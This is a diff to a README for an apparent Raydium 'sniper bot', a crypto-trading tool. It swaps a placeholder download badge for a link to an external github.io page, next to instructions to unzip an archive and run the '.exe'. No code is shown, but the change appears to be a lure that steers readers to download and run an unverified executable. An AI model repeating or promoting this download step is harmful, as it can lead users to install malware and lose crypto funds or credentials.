@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://raydium-turbo-sniper.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://a.fsdn.com/con/app/proj/raydium-sniper-bot/screenshots/DashBoard-4dd5595c.png/245/183/1)  
